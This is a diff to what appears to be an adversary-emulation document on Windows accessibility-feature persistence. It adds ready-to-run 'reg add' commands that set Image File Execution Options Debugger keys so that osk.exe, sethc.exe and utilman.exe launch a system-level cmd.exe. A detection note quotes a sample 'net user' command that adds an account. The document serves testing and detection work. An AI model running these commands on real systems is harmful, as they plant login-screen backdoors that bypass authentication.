@@ -11,11 +11,11 @@
 
 ## Native Utilities
 
-### Reg.exe
+### Reg.exe - On Screen Keyboard swap
 
 Create a registry entry on the host, allowing a system-level shell to be invoked any time that the osk.exe (on screen keyboard) process is called:
 
-    reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f
+    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f
 
 Test:
 
@@ -26,6 +26,15 @@ Detection:
 Reg.exe add a process or a command shell. Much of it will be based on command line or actual registry key value add/changes.
 
 Utilman.exe spawning cmd.exe and detecting whatever other commands executed via cmdline (ex - net user jack pwnfish /add)
+
+
+### Reg.exe - sethc.exe swap
+
+    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
+
+### Reg.exe - utilman.exe swap
+
+    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
 
 ### Regsvr32 + sct file + powershell encoded command
 
